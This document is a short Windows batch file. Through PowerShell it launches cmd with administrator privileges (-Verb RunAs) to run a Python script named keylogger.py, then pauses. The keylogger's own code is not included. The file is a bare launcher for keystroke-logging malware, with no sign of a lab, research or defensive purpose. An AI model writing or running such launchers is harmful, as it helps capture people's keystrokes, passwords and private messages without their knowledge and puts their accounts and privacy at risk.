@echo off
powershell -Command "Start-Process cmd -ArgumentList '/k python keylogger.py' -Verb RunAs"
pause
